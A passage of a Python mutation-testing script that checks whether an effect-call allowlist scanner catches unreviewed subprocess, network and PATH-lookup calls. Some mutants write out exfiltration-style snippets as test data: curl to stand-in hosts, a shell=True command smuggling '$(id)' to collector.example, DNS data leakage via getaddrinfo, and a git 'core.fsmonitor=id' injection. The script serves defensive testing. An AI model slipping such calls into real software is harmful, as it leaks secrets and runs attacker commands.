"""The effect-call allowlist (MU-D) must fail on every way an unreviewed effect can enter greg/, foundry/systems/ or
a repository module they import.

Each mutant edits a scratch copy of the tree: source modules (a new effect call, an aliased, re-exported, rebound or
star import, a call moved into a new function, an extra occurrence, an unchecked caller of a declared wrapper, an
effect in an evaluated annotation, a listener, an httpx2 client, an effect module used as a value, a TLS dial, a
connecting urllib handler, a name lookup, a stdlib call that spawns on PATH, a rewritten known_unmediated spawn or a
constant it reads, an effect in an imported module outside greg/, code run from a string, a context that spawns, a
loop method on a named receiver, a new or widened program lookup, a rewritten allowed call or a constant it reads),
the allowlist (an entry removed, a stale or miscounted entry, an unknown capability, a wrapper undeclared or
mis-declared, a body-loop finding filed as an approval or re-filed with a person-run serves, a pin dropped or stale,
a lookup removed or misstated, an envelope claim that hides the ambient PATH), or the scanner itself (so its
self-tests stay load-bearing). A mutant is CAUGHT only when the named test fails and its output names the expected
site.

    python scripts/ci/check_effect_call_allowlist_mutants.py
"""
from pathlib import Path
import json, os, shutil, subprocess, sys, tempfile

ROOT = Path(__file__).resolve().parents[2]
TEST = "tests/unit/test_effect_call_allowlist.py"
ALLOWLIST = "tests/security/effect-call-allowlist.json"
TREE, FORMED = f"{TEST}::test_every_effect_call_site_is_listed", f"{TEST}::test_allowlist_is_well_formed"
FORMS = f"{TEST}::test_every_import_form_and_call_shape_is_resolved"
QUIET = f"{TEST}::test_what_is_not_an_effect_is_not_listed"
NAMES = f"{TEST}::test_names_are_followed_across_scanned_modules"
WRAPS = f"{TEST}::test_declared_wrappers_are_listed_at_each_caller"
STARS = f"{TEST}::test_a_star_import_fails_and_cannot_be_listed"
MODULES = f"{TEST}::test_an_effect_module_used_as_a_value_and_the_added_callees_are_sites"
PINS = f"{TEST}::test_a_known_unmediated_pin_binds_its_reason_to_the_code"
CALL_PINS = f"{TEST}::test_an_allowed_pin_binds_its_justification_to_the_calls"
FINDING = f"{TEST}::test_a_finding_cannot_be_refiled_as_an_approval"
ROUND3 = f"{TEST}::test_the_round_three_forms_are_sites"
LOOKUPS = f"{TEST}::test_program_lookups_record_what_they_search"
ENVELOPE = f"{TEST}::test_an_envelope_claim_names_the_ambient_path"
IMPORTS = f"{TEST}::test_the_scan_follows_imports_into_the_repository"
ROOTS = f"{TEST}::test_sys_path_roots_are_module_roots"
SYSCTL = 'out = subprocess.run(["/usr/sbin/sysctl", "-n", "hw.memsize"], capture_output=True, text=True, timeout=5)'
DPKG = ('        proc = subprocess.run([dpkg, "-S", real], capture_output=True, text=True, timeout=DPKG_TIMEOUT,\n'
        '                              env={"PATH": "/usr/bin:/bin", "LC_ALL": "C"})')
UNLISTED = "UNLISTED effect call site "
PIN = "PIN MISMATCH known_unmediated "
CANONICAL = 'text = "\\n".join(_canonical(node) for node in (definition, *constants))'
CALLS = 'text = "\\n".join(sorted(_canonical(node) for node in nodes)) + "\\n--\\n" + "\\n".join(map(_canonical, constants))'
ALLOWED_PIN = "PIN MISMATCH allowed "
# The two pin comparisons, each with the line after it so the anchor occurs once.
KNOWN_PIN_CHECK = '        if entry.get("pin") != digest:\n            reads = f" or a top-level constant it reads'
ALLOWED_PIN_CHECK = '        if entry.get("pin") != digest:\n            reads = f" and the top-level constants they read'


def append(text):
    return lambda source: source + text


def write(text):
    return lambda _: text


def replace(*pairs):
    def mutate(source):
        for old, new in pairs:
            if source.count(old) != 1:
                raise LookupError(f"anchor not found exactly once: {old[:60]!r}")
            source = source.replace(old, new)
        return source
    return mutate


def allowlist(edit):
    def mutate(source):
        document = json.loads(source)
        edit(document)
        return json.dumps(document, indent=1)
    return mutate


def drop(section, module, qualname):
    def edit(document):
        kept = [e for e in document[section] if (e["module"], e["qualname"]) != (module, qualname)]
        if len(kept) == len(document[section]):
            raise LookupError(f"no {section} entry {module} :: {qualname}")
        document[section] = kept
    return edit


def entry(module, qualname, change, section="allowed"):
    def edit(document):
        for e in document[section]:
            if (e["module"], e["qualname"]) == (module, qualname):
                change(e)
                return
        raise LookupError(f"no {section} entry {module} :: {qualname}")
    return edit


def move_to_allowed(module, qualname, serves=None):
    """A known_unmediated entry re-filed under allowed, keeping its pin; with ``serves`` its body-loop serves are
    replaced by a person-run one, the realistic re-filing the malformed check alone cannot see."""
    def edit(document):
        found = [e for e in document["known_unmediated"] if (e["module"], e["qualname"]) == (module, qualname)]
        if len(found) != 1:
            raise LookupError(f"no known_unmediated entry {module} :: {qualname}")
        document["known_unmediated"].remove(found[0])
        moved = {**found[0], "justification": found[0]["reason"], **({"serves": serves} if serves else {})}
        del moved["reason"]
        document["allowed"].append(moved)
    return edit


def move_to_unmediated(module, qualname):
    def edit(document):
        found = [e for e in document["allowed"] if (e["module"], e["qualname"]) == (module, qualname)]
        if len(found) != 1:
            raise LookupError(f"no allowed entry {module} :: {qualname}")
        document["allowed"].remove(found[0])
        moved = {**found[0], "reason": found[0]["justification"], "serves": ["body-loop:Body.tick"]}
        del moved["justification"]
        document["known_unmediated"].append(moved)
    return edit


def lookup(module, qualname, program, change):
    def edit(document):
        for e in document["path_lookups"]:
            if (e["module"], e["qualname"], e["program"]) == (module, qualname, program):
                change(document, e)
                return
        raise LookupError(f"no path lookup {module} :: {qualname} :: {program}")
    return edit


def wrapper(qualname, change):
    def edit(document):
        for w in document["wrappers"]:
            if w["qualname"] == qualname:
                change(document, w)
                return
        raise LookupError(f"no wrapper {qualname}")
    return edit


def one(relative, mutate):
    return [(relative, mutate)]


# (name, [(file, mutation), ...], test node, text the failure output must contain)
MUTANTS = [
    # -- an unreviewed effect enters the source ---------------------------------------------------------
    ("new effect call in a listed module", one("greg/compute.py",
     append('\n\ndef _mutant_probe():\n    return subprocess.run(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_probe :: subprocess.run"),
    ("new module with a network call", one("greg/_mutant_new.py",
     write('import socket\n\n\ndef dial():\n    return socket.create_connection(("example.org", 443))\n')),
     TREE, UNLISTED + "greg/_mutant_new.py :: dial :: socket.create_connection"),
    ("aliased from-import (from subprocess import run as r)", one("greg/presence.py",
     append('\n\nfrom subprocess import run as r  # noqa: E402\n\n\ndef _mutant_alias():\n    return r(["true"])\n')),
     TREE, UNLISTED + "greg/presence.py :: _mutant_alias :: subprocess.run"),
    ("aliased module import (import subprocess as sp)", one("greg/presence.py",
     append('\n\nimport subprocess as sp  # noqa: E402\n\n\n'
            'def _mutant_module_alias():\n    return sp.Popen(["true"])\n')),
     TREE, UNLISTED + "greg/presence.py :: _mutant_module_alias :: subprocess.Popen"),
    ("module rebound by assignment (sp = subprocess)", one("greg/compute.py",
     append('\n\ndef _mutant_rebind():\n    sp = subprocess\n    return sp.run(["curl", "https://collector.example"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_rebind :: subprocess.run"),
    ("name re-exported by another scanned module", [
        ("greg/compute.py", append("\n\nfrom subprocess import run as _host_run  # noqa: E402,F401\n")),
        ("greg/presentation.py", append("\n\nfrom greg.compute import _host_run  # noqa: E402\n\n\n"
                                        "def _mutant_reexport():\n    return _host_run(['curl', 'https://x.example'])\n"))],
     TREE, UNLISTED + "greg/presentation.py :: _mutant_reexport :: subprocess.run"),
    ("star import", one("greg/_mutant_star.py",
     write("from subprocess import *  # noqa: F403\n\n\ndef go():\n    return run(['curl', 'https://x.example'])\n")),
     TREE, "STAR IMPORT greg/_mutant_star.py :: <module> :: subprocess.*"),
    ("sys.modules lookup", one("greg/compute.py",
     append('\n\ndef _mutant_sysmodules():\n    return sys.modules["subprocess"].run(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_sysmodules :: subprocess.run"),
    ("dynamic getattr on the module", one("greg/compute.py",
     append('\n\ndef _mutant_getattr():\n    return getattr(subprocess, "run")(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_getattr :: subprocess.run"),
    ("injected runner default", one("greg/compute.py",
     append('\n\ndef _mutant_inject(runner=subprocess.run):\n    return runner(["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_inject :: subprocess.run (1 reference)"),
    ("effect call moved into a new function", one("greg/compute.py",
     replace(("def memory_bytes() -> int | None:",
              ('def _sysctl():\n    return subprocess.run(["/usr/sbin/sysctl", "-n", "hw.memsize"], '
               'capture_output=True, text=True, timeout=5)\n\n\ndef memory_bytes() -> int | None:')),
             (SYSCTL, "out = _sysctl()"))),
     TREE, UNLISTED + "greg/compute.py :: _sysctl :: subprocess.run"),
    ("second occurrence in the same function", one("greg/compute.py",
     replace((SYSCTL, SYSCTL + "\n            " + SYSCTL))),
     TREE, "COUNT MISMATCH greg/compute.py :: memory_bytes :: subprocess.run"),
    ("asyncio.subprocess from-import", one("greg/mcp_login.py",
     append("\n\nfrom asyncio.subprocess import create_subprocess_exec  # noqa: E402\n\n\n"
            "async def _mutant_spawn():\n    return await create_subprocess_exec('curl', 'https://x.example')\n")),
     TREE, UNLISTED + "greg/mcp_login.py :: _mutant_spawn :: asyncio.create_subprocess_exec"),
    ("urllib.request.urlretrieve", one("greg/briefs.py",
     append("\n\ndef _mutant_fetch(url):\n    return urllib.request.urlretrieve(url, '/tmp/x')\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_fetch :: urllib.request.urlretrieve"),
    ("asyncio.open_connection", one("greg/mcp_login.py",
     append("\n\nasync def _mutant_dial():\n    return await asyncio.open_connection('x.example', 443)\n")),
     TREE, UNLISTED + "greg/mcp_login.py :: _mutant_dial :: asyncio.open_connection"),
    ("httpx2 request", one("greg/compute.py",
     append("\n\ndef _mutant_httpx2(payload):\n    import httpx2\n"
            "    return httpx2.post('https://collector.example/x', content=payload)\n")),
     TREE, UNLISTED + "greg/compute.py :: _mutant_httpx2 :: httpx2.post"),
    ("inbound listener", one("greg/compute.py",
     append("\n\ndef _mutant_listen():\n    import http.server\n"
            "    return http.server.ThreadingHTTPServer(('0.0.0.0', 8080), None)\n")),
     TREE, UNLISTED + "greg/compute.py :: _mutant_listen :: http.server.ThreadingHTTPServer"),
    ("effect in an evaluated return annotation (no __future__ import)", one("greg/presentation.py",
     append("\n\nimport os as _os  # noqa: E402\n\n\ndef _mutant_annot() -> _os.system('true'):\n    pass\n")),
     TREE, UNLISTED + "greg/presentation.py :: _mutant_annot :: os.system"),
    ("opener built around greg.egress's allowlist check", one("greg/anchor.py",
     append("\n\ndef _mutant_unchecked(req):\n    return egress.opener().open(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_unchecked :: urllib.request.build_opener().open"),
    ("opener's open held as a bound method", one("greg/anchor.py",
     append("\n\ndef _mutant_bound(req):\n    send = egress.opener().open\n    return send(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_bound :: urllib.request.build_opener().open (1 reference)"),
    ("getattr(opener, 'open')", one("greg/anchor.py",
     append("\n\ndef _mutant_getattr_open(req):\n    return getattr(egress.opener(), 'open')(req, timeout=5)\n")),
     TREE, UNLISTED + "greg/anchor.py :: _mutant_getattr_open :: urllib.request.build_opener().open"),
    ("new caller of egress.send (no allowlist check)", one("greg/briefs.py",
     append("\n\ndef _mutant_unchecked_send(url):\n    return egress.send(urllib.request.Request(url), 5)\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_unchecked_send :: greg.egress.send"),
    ("new run_isolated call with isolate_network=False", one("greg/briefs.py",
     append("\n\ndef _mutant_open_network(argv, cwd):\n    from greg.capabilities import run_isolated\n"
            "    return run_isolated(argv, cwd=cwd, isolate_network=False)\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_open_network :: greg.capabilities.run_isolated"),
    ("module object stored on an attribute (self.sp = subprocess)", one("greg/compute.py",
     append('\n\nclass _MutantRunner:\n    def __init__(self):\n        self.sp = subprocess\n\n'
            '    def go(self):\n        return self.sp.run(["curl", "https://collector.example"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _MutantRunner.__init__ :: subprocess (1 module reference)"),
    ("module as an injected default (sp=subprocess)", one("greg/compute.py",
     append('\n\ndef _mutant_module_default(argv, sp=subprocess):\n    return sp.run(argv)\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_module_default :: subprocess (1 module reference)"),
    ("module passed as an argument (vars(subprocess)[...])", one("greg/compute.py",
     append('\n\ndef _mutant_vars():\n    return vars(subprocess)["run"](["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_vars :: subprocess (1 module reference)"),
    ("module namespace (subprocess.__dict__[...])", one("greg/compute.py",
     append('\n\ndef _mutant_namespace():\n    return subprocess.__dict__["Popen"](["true"])\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_namespace :: subprocess (1 module reference)"),
    ("module as a class attribute (host = os), read as self.host", one("greg/compute.py",
     append('\n\nclass _MutantHost:\n    host = os\n\n    def go(self):\n        return self.host.system("true")\n')),
     TREE, UNLISTED + "greg/compute.py :: _MutantHost :: os (1 module reference)"),
    ("ssl.create_connection", one("greg/compute.py",
     append('\n\ndef _mutant_tls():\n    import ssl\n    return ssl.create_connection(("collector.example", 443))\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_tls :: ssl.create_connection"),
    ("urllib.request handler that connects", one("greg/briefs.py",
     append("\n\ndef _mutant_handler(req):\n    return urllib.request.HTTPSHandler().https_open(req)\n")),
     TREE, UNLISTED + "greg/briefs.py :: _mutant_handler :: urllib.request.HTTPSHandler"),
    ("name lookup carrying data (socket.getaddrinfo)", one("greg/compute.py",
     append('\n\ndef _mutant_dns(secret):\n    import socket\n'
            '    return socket.getaddrinfo(secret + ".collector.example", 443)\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_dns :: socket.getaddrinfo"),
    ("stdlib call that spawns uname on PATH (platform.processor)", one("greg/compute.py",
     append('\n\ndef _mutant_processor():\n    return platform.processor()\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_processor :: platform.processor"),
    ("second spawn in system_binary through a module attribute", one("greg/licensing.py",
     replace((DPKG, DPKG + '\n        holder = type("H", (), {})()\n        holder.sp = subprocess\n'
                           '        holder.sp.run(["sh", "-c", "id"])'))),
     TREE, UNLISTED + "greg/licensing.py :: system_binary :: subprocess (1 module reference)"),
    ("known_unmediated spawn rewritten (shell=True, inherited env, no timeout)", one("greg/licensing.py",
     replace((DPKG, ('        proc = subprocess.run("dpkg-query -S " + real\n'
                     '                              + "; curl -s https://collector.example/$(id)",\n'
                     '                              shell=True, capture_output=True, text=True)')))),
     TREE, PIN + "greg/licensing.py :: system_binary :: subprocess.run"),
    ("constant a known_unmediated reason states changes (DPKG_TIMEOUT = 500)", one("greg/licensing.py",
     replace(("DPKG_TIMEOUT = 5\n", "DPKG_TIMEOUT = 500\n"))),
     TREE, PIN + "greg/licensing.py :: system_binary :: subprocess.run"),
    ("draft P4c binary policy activated (requalify_binary goes live)", one("greg/licensing.py",
     replace(('ACTIVE_BINARY_POLICY = "P0"', 'ACTIVE_BINARY_POLICY = "P4c"'))),
     TREE, PIN + "greg/licensing.py :: requalify_binary :: greg.licensing.system_binary"),
    ("new caller of licensing.system_binary", one("greg/presentation.py",
     append("\n\ndef _mutant_new_reach(path):\n    from greg import licensing\n"
            "    return licensing.system_binary(path)\n")),
     TREE, UNLISTED + "greg/presentation.py :: _mutant_new_reach :: greg.licensing.system_binary"),
    ("new caller of egregore.repository_audit.git_read", one("greg/presentation.py",
     append("\n\ndef _mutant_git(path):\n    from egregore.repository_audit import git_read\n"
            "    return git_read(path, '-c', 'core.fsmonitor=id', 'status')\n")),
     TREE, UNLISTED + "greg/presentation.py :: _mutant_git :: egregore.repository_audit.git_read"),
    ("new effect in an imported module outside greg/ (egregore)", one("egregore/repository_audit.py",
     append("\n\ndef _mutant_upload(data):\n    import urllib.request\n"
            "    return urllib.request.urlopen('https://collector.example', data)\n")),
     TREE, UNLISTED + "egregore/repository_audit.py :: _mutant_upload :: urllib.request.urlopen"),
    ("new repository module reached only through an import", [
        ("egregore/_mutant_helper.py", write("import socket\n\n\ndef dial():\n"
                                             "    return socket.create_connection(('collector.example', 443))\n")),
        ("greg/compute.py", append("\n\nfrom egregore import _mutant_helper  # noqa: E402,F401\n"))],
     TREE, UNLISTED + "egregore/_mutant_helper.py :: dial :: socket.create_connection"),
    ("new effect in the module loaded from tools/ (offline_test)", one("tools/offline_test.py",
     append("\n\ndef _mutant_tool():\n    return os.system('id')\n")),
     TREE, UNLISTED + "tools/offline_test.py :: _mutant_tool :: os.system"),
    ("code run from a string (exec of a literal)", one("greg/compute.py",
     append("\n\ndef _mutant_exec():\n    exec(\"import subprocess; subprocess.run(['id'])\")\n")),
     TREE, UNLISTED + "greg/compute.py :: _mutant_exec :: builtins.exec"),
    ("a context whose Process spawns (multiprocessing.get_context)", one("greg/compute.py",
     append('\n\ndef _mutant_context():\n    import multiprocessing\n'
            '    return multiprocessing.get_context("spawn").Process(target=print).start()\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_context :: multiprocessing.get_context"),
    ("loop method on a class attribute (C.loop.subprocess_exec)", one("greg/compute.py",
     append('\n\nclass _MutantLoop:\n    loop = None\n\n\ndef _mutant_loop(handler):\n'
            '    return _MutantLoop.loop.subprocess_exec(handler, "id")\n')),
     TREE, UNLISTED + "greg/compute.py :: _mutant_loop :: asyncio.AbstractEventLoop.subprocess_exec"),
    ("new program lookup on the ambient PATH", one("greg/compute.py",
     append('\n\ndef _mutant_which():\n    import shutil\n    return shutil.which("curl")\n')),
     TREE, "UNLISTED path lookup greg/compute.py :: _mutant_which :: curl"),
    ("pinned git lookup moved to the ambient PATH (env dropped)", one("greg/organs.py",
     replace(('                             timeout=10, env={"PATH": "/usr/bin:/bin", "GIT_CONFIG_NOSYSTEM": "1"})',
              '                             timeout=10)'))),
     TREE, "SEARCHES MISMATCH path lookup greg/organs.py :: _head :: git"),
    ("allowed call rewritten (systemctl show-environment -> start)", one("greg/doctor.py",
     replace(('["systemctl", "--user", "show-environment"]', '["systemctl", "--user", "start", "greg"]'))),
     TREE, ALLOWED_PIN + "greg/doctor.py :: chromebook :: subprocess.run"),
    ("constant an allowed call reads changes (CI_TIMEOUT = 120000)", one("foundry/systems/commissioning.py",
     replace(("CI_TIMEOUT = 120\n", "CI_TIMEOUT = 120000\n"))),
     TREE, ALLOWED_PIN + "foundry/systems/commissioning.py :: Commission._ci :: subprocess.run"),
    # -- the allowlist loses or misstates an entry --------------------------------------------------------
    ("allowed entry removed", one(ALLOWLIST, allowlist(drop("allowed", "greg/egress.py", "send"))),
     TREE, UNLISTED + "greg/egress.py :: send :: urllib.request.build_opener().open"),
    ("known_unmediated entry removed (Body.appraise)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/body.py", "Body.appraise"))),
     TREE, UNLISTED + "greg/body.py :: Body.appraise :: subprocess.run"),
    ("known_unmediated entry removed (memory_bytes)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/compute.py", "memory_bytes"))),
     TREE, UNLISTED + "greg/compute.py :: memory_bytes :: subprocess.run"),
    ("known_unmediated entry removed (system_binary)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/licensing.py", "system_binary"))),
     TREE, UNLISTED + "greg/licensing.py :: system_binary :: subprocess.run"),
    ("body-loop finding filed as an approval", one(ALLOWLIST, allowlist(move_to_allowed("greg/compute.py", "memory_bytes"))),
     FORMED, "belongs under known_unmediated"),
    ("stale entry", one(ALLOWLIST, allowlist(lambda d: d["allowed"].append(
        {**next(e for e in d["allowed"] if e["module"] == "foundry/systems/build.py"), "qualname": "gone"}))),
     TREE, "STALE allowed entry foundry/systems/build.py :: gone :: subprocess.run"),
    ("wrong count", one(ALLOWLIST, allowlist(entry("greg/organs.py", "_snapshot", lambda e: e.update(count=2)))),
     TREE, "COUNT MISMATCH greg/organs.py :: _snapshot :: subprocess.run"),
    ("unknown capability served", one(ALLOWLIST,
     allowlist(entry("greg/workers.py", "appraise", lambda e: e.update(serves=["capability:worker.anything"])))),
     FORMED, "names no capability in greg.capabilities.BUILTINS"),
    ("justification emptied", one(ALLOWLIST,
     allowlist(entry("greg/workers.py", "appraise", lambda e: e.update(justification="ok")))),
     FORMED, "must say, in words grounded in the code"),
    ("wrapper undeclared (greg.egress.send)", one(ALLOWLIST,
     allowlist(wrapper("send", lambda d, w: d["wrappers"].remove(w)))),
     TREE, "STALE allowed entry greg/anchor.py :: _post :: greg.egress.send"),
    ("wrapper exemption misstated (isolate_network=False)", one(ALLOWLIST,
     allowlist(wrapper("run_isolated", lambda d, w: w.update(exempt_when={"isolate_network": False})))),
     TREE, "exempt_when isolate_network=False needs a keyword-only parameter"),
    ("known_unmediated entry removed (_binary_license)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/genesis.py", "_binary_license"))),
     TREE, UNLISTED + "greg/genesis.py :: _binary_license :: greg.licensing.system_binary"),
    ("known_unmediated entry removed (requalify_binary)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "greg/licensing.py", "requalify_binary"))),
     TREE, UNLISTED + "greg/licensing.py :: requalify_binary :: greg.licensing.system_binary"),
    ("wrapper undeclared (greg.licensing.system_binary)", one(ALLOWLIST,
     allowlist(wrapper("system_binary", lambda d, w: d["wrappers"].remove(w)))),
     TREE, "STALE known_unmediated entry greg/genesis.py :: _binary_license :: greg.licensing.system_binary"),
    ("known_unmediated pin dropped", one(ALLOWLIST,
     allowlist(entry("greg/compute.py", "memory_bytes", lambda e: e.pop("pin"), section="known_unmediated"))),
     FORMED, "must have exactly the fields"),
    ("known_unmediated pin stale", one(ALLOWLIST,
     allowlist(entry("greg/compute.py", "memory_bytes", lambda e: e.update(pin="0" * 64), section="known_unmediated"))),
     TREE, PIN + "greg/compute.py :: memory_bytes :: subprocess.run"),
    ("finding re-filed as an approval with a person-run serves (system_binary)", one(ALLOWLIST,
     allowlist(move_to_allowed("greg/licensing.py", "system_binary", serves=["operator:greg status"]))),
     TREE, "FINDING RE-FILED greg/licensing.py :: system_binary :: subprocess.run"),
    ("allowed site filed as a finding without FINDINGS", one(ALLOWLIST,
     allowlist(move_to_unmediated("greg/doctor.py", "chromebook"))),
     TREE, "NEW FINDING greg/doctor.py :: chromebook :: subprocess.run"),
    ("known_unmediated entry removed (install_filter)", one(ALLOWLIST,
     allowlist(drop("known_unmediated", "tools/offline_test.py", "install_filter"))),
     TREE, UNLISTED + "tools/offline_test.py :: install_filter :: ctypes.util.find_library"),
    ("wrapper undeclared (egregore.repository_audit.git_read)", one(ALLOWLIST,
     allowlist(wrapper("git_read", lambda d, w: d["wrappers"].remove(w)))),
     TREE, "STALE allowed entry greg/briefs.py :: _git :: egregore.repository_audit.git_read"),
    ("allowed pin dropped", one(ALLOWLIST,
     allowlist(entry("greg/ventures.py", "_git_head", lambda e: e.pop("pin")))),
     FORMED, "must have exactly the fields"),
    ("allowed pin stale", one(ALLOWLIST,
     allowlist(entry("greg/ventures.py", "_git_head", lambda e: e.update(pin="0" * 64)))),
     TREE, ALLOWED_PIN + "greg/ventures.py :: _git_head :: subprocess.run"),
    ("path lookup removed (dpkg-query on the ambient PATH)", one(ALLOWLIST,
     allowlist(lookup("greg/licensing.py", "system_binary", "dpkg-query",
                      lambda d, e: d["path_lookups"].remove(e)))),
     TREE, "UNLISTED path lookup greg/licensing.py :: system_binary :: dpkg-query"),
    ("path lookup misstated (bwrap said to search /usr/bin:/bin)", one(ALLOWLIST,
     allowlist(lookup("greg/worker_isolation.py", "_backend", "bwrap",
                      lambda d, e: e.update(searches="/usr/bin:/bin")))),
     TREE, "SEARCHES MISMATCH path lookup greg/worker_isolation.py :: _backend :: bwrap"),
    ("envelope claim that hides the ambient PATH (_backend's round-2 text)", one(ALLOWLIST,
     allowlist(entry("greg/worker_isolation.py", "_backend", lambda e: e.update(
         justification="probe: /usr/bin/true inside the bubblewrap envelope, to learn whether workers and "
                       "namespaced capabilities can be confined; nothing else runs")))),
     TREE, "ENVELOPE CLAIM allowed greg/worker_isolation.py :: _backend :: subprocess.run"),
    # -- the scanner itself is weakened -------------------------------------------------------------------
    ("scanner ignores `import x as y`", one(TEST,
     replace(("self.names[alias.asname].add(alias.name)", "pass"))), FORMS, "subprocess"),
    ("scanner ignores bare references", one(TEST,
     replace(("if (isinstance(node, (ast.Name, ast.Attribute)) and isinstance(node.ctx, ast.Load)", "if (False"))),
     FORMS, "injected"),
    ("scanner ignores an opener's .open", one(TEST,
     replace(('if isinstance(node, ast.Attribute) and node.attr == "open" and self.builds_opener(node.value):',
              "if False:"))), NAMES, "build_opener().open"),
    ("scanner drops suffix matching (re-exported modules)", one(TEST,
     replace(("for start in range(len(parts)):", "for start in range(1):"))), FORMS, "subprocess.run"),
    ("scanner stops following names across modules", one(TEST,
     replace(('module = self.modules.get(".".join(parts[:cut]))', "module = None"))), NAMES, "subprocess.run"),
    ("scanner ignores rebinding by assignment", one(TEST,
     replace(("targets = [(target.id, value) for target, value in self.bindings if isinstance(target, ast.Name)]",
              "targets = []"))), FORMS, "subprocess.run"),
    ("scanner ignores sys.modules", one(TEST,
     replace(('if isinstance(literal, str) and "sys.modules" in self.resolve(node.value):', "if False:"))),
     FORMS, "subprocess.run"),
    ("scanner allows star imports", one(TEST,
     replace(('self._record(qual, f"{base}.*", "star-import", node)', "pass"))), STARS, "subprocess.*"),
    ("scanner ignores declared wrappers", one(TEST,
     replace(("if name in self.index.wrappers:", "if False:"))), WRAPS, "greg.egress.send"),
    ("scanner treats every wrapper call as exempt", one(TEST,
     replace(("    return all(name not in passed", "    return True or all(name not in passed"))), WRAPS, "run_isolated"),
    ("scanner ignores an opener's .open held as a value", one(TEST,
     replace(("if (opener := self._opened(node)) is not None:      # send = opener().open", "if False:"))),
     WRAPS, "build_opener().open"),
    ("scanner skips annotations Python evaluates", one(TEST,
     replace(("if not self.lazy_annotations and not isinstance(node, ast.Lambda):", "if False:"))),
     FORMS, "annotated"),
    ("scanner reads annotations under from __future__ import annotations", one(TEST,
     replace(("if not self.lazy_annotations and not isinstance(node, ast.Lambda):",
              "if not isinstance(node, ast.Lambda):"))), QUIET, "os.system"),
    ("scanner records type positions (isinstance's class argument)", one(TEST,
     replace(("self._visit(node.args[1], qual, typed=True, local=local)", "self._visit(node.args[1], qual, local=local)"))),
     QUIET, "socket.socket"),
    ("scanner records attributes of an effect callable", one(TEST,
     replace(("return True                                     # subprocess.run.__doc__ starts nothing", "pass"))),
     QUIET, "subprocess.run"),
    ("scanner counts every member of an HTTP library", one(TEST,
     replace(("last in HTTP_ENTRY_POINTS and all(part.islower() for part in middle)", "bool(attr)"))),
     QUIET, "requests"),
    ("scanner drops httpx2", one(TEST,
     replace(('HTTP_LIBRARIES = frozenset({"requests", "httpx", "httpx2", "urllib3", "aiohttp"})',
              'HTTP_LIBRARIES = frozenset({"requests", "httpx", "urllib3", "aiohttp"})'))), FORMS, "httpx2"),
    ("scanner drops inbound listeners", one(TEST,
     replace(('"http.server.ThreadingHTTPServer", *(f"socketserver.{server}"', '*(f"socketserver.{server}"'))),
     FORMS, "ThreadingHTTPServer"),
    ("scanner ignores module references", one(TEST,
     replace(("if not typed and id(node) not in self.followed:", "if False:"))), MODULES, "subprocess"),
    ("scanner follows class-level names (host = os)", one(TEST,
     replace((" \\\n                    or id(node) in in_class:", ":"))), MODULES, "Runner"),
    ("scanner ignores a module's namespace (__dict__)", one(TEST,
     replace(("if _hands_out_namespace(node.attr) and not typed:", "if False:"))), MODULES, "passed"),
    ("scanner reads getattr(module, literal) as a module reference", one(TEST,
     replace(("elif (module := self._module_read(node)) is not None:", "elif False:"))), QUIET, "'quiet', 'os'"),
    ("scanner reports module references bound to plain names", one(TEST,
     replace(("        return followed\n", "        return set()\n"))), FORMS, "subprocess"),
    ("scanner drops name lookups", one(TEST,
     replace(('    *(f"socket.{lookup}" for lookup in DNS_LOOKUPS),\n', ""))), MODULES, "getaddrinfo"),
    ("scanner drops the stdlib calls that spawn on PATH", one(TEST,
     replace(('"platform.platform", "platform.processor", "platform.architecture", "ctypes.util.find_library",', ""))),
     MODULES, "platform"),
    ("scanner drops the urllib handlers that connect", one(TEST,
     replace(('"urllib.request.OpenerDirector", "urllib.request.HTTPHandler", "urllib.request.HTTPSHandler",',
              '"urllib.request.OpenerDirector",'))), MODULES, "HTTPSHandler"),
    ("pin ignores the constants a definition reads", one(TEST,
     replace((CANONICAL, "text = _canonical(definition)"))), PINS, "!= digest for text in changed"),
    ("pin compares source text, not parsed code", one(TEST,
     replace((CANONICAL, ('text = "\\n".join(ast.get_source_segment(source, node) or "" for node in '
                          '(definition, *constants))')))), PINS, "[digest] * 3"),
    ("pin mismatch never reported", one(TEST,
     replace((KNOWN_PIN_CHECK, KNOWN_PIN_CHECK.replace('entry.get("pin") != digest', "False")))),
     PINS, "len(problems) == 1"),
    ("any pin accepted as well formed", one(TEST,
     replace(('re.fullmatch(r"[0-9a-f]{64}", entry["pin"])', "True"))), PINS, "pin must be the sha256 digest"),
    ("allowed pin mismatch never reported", one(TEST,
     replace((ALLOWED_PIN_CHECK, ALLOWED_PIN_CHECK.replace('entry.get("pin") != digest', "False")))),
     CALL_PINS, "PIN MISMATCH allowed greg/p.py :: probe :: subprocess.run"),
    ("allowed pin ignores the constants the calls read", one(TEST,
     replace((CALLS, 'text = "\\n".join(sorted(_canonical(node) for node in nodes))'))),
     CALL_PINS, "!= digest for text in changed"),
    ("finding re-filing never reported", one(TEST,
     replace(("for key in sorted(FINDINGS - filed)", "for key in sorted(set())"))), FINDING, "FINDING RE-FILED"),
    ("loop methods only on a receiver the scan cannot name (round 3's rule)", one(TEST,
     replace(("elif isinstance(func, ast.Attribute) and func.attr in LOOP_METHODS:",
              "elif isinstance(func, ast.Attribute) and func.attr in LOOP_METHODS and not self.resolve(func.value):"),
